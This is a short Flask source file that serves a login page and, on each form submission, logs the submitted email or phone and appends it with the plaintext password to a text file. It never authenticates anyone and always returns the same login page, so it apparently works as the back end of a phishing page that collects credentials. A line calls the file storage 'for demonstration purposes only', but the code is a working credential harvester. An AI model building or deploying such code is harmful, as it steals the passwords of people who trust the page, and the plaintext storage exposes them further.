from flask import Flask, render_template, request
import logging

app = Flask(__name__)

# Configure logging to display messages in the Render log console
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Validate and sanitize input
        email = email.strip()

        # Log messages to Render log console
        logger.info(f"Login attempt - Email or Phone: {email}")
        print(f"Login attempt - Email or Phone: {email}")

        # Store data in a text file (for demonstration purposes only)
        with open('user_data.txt', 'a') as file:
            file.write(f"Email or Phone: {email} | Password: {password}\n")

    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
